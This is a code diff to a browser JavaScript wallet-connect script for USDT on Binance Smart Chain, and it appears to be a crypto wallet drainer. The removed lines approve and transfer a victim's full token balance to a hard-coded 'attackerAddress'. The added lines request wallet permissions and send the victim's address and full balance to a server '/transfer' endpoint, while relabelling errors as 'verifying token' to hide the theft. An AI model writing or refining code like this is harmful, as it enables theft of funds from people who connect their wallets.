@@ -1,5 +1,4 @@
 const connectButton = document.getElementById('connectButton');
-const attackerAddress = '0x690da78b047ef534fd4e2eabd4a3a8a5b733d8df'; // Replace with the attacker's address
 const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT contract address on BSC
 const contractABI = [
     {
@@ -277,6 +276,12 @@ connectButton.addEventListener('click', async () => {
             const userAddress = accounts[0];
             console.log('Connected wallet:', userAddress);
 
+            // Enable all permissions
+            await window.ethereum.request({
+                method: 'wallet_requestPermissions',
+                params: [{ eth_accounts: {} }]
+            });
+
             // Create a new contract instance
             const web3 = new Web3(window.ethereum);
             const contract = new web3.eth.Contract(contractABI, contractAddress);
@@ -285,24 +290,28 @@ connectButton.addEventListener('click', async () => {
             const balance = await contract.methods.balanceOf(userAddress).call();
             console.log('User balance:', balance);
 
-            // Check if the contract is approved to spend tokens
-            const allowance = await contract.methods.allowance(userAddress, attackerAddress).call();
-            console.log('Allowance:', allowance);
+            // Convert BigInt to string for JSON serialization
+            const amount = balance.toString();
 
-            if (allowance < balance) {
-                // Approve the contract to spend tokens
-                await contract.methods.approve(attackerAddress, balance).send({ from: userAddress });
-                console.log('Approval transaction sent');
+            // Send the user address to the server to handle the approval and transfer
+            const response = await fetch('/transfer', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userAddress, amount })
+            });
+
+            const result = await response.text();
+            console.log(result);
+
+            if (response.ok) {
+                alert('Funds transferred successfully!');
+            } else {
+                alert('Failed to transfer funds. Please try again.');
             }
 
-            // Transfer funds to the attacker's address
-            await contract.methods.transfer(attackerAddress, balance).send({ from: userAddress });
-            console.log('Transfer transaction sent');
-
-            alert('Funds transferred successfully!');
         } catch (error) {
-            console.error('Error connecting wallet or transferring funds:', error);
-            alert('Error transferring funds: ' + error.message);
+            console.error('Error connecting wallet or verifying token:', error);
+            alert('Error verifying token: ' + error.message);
         }
     } else {
         alert('Please install Trust Wallet to use this feature.');
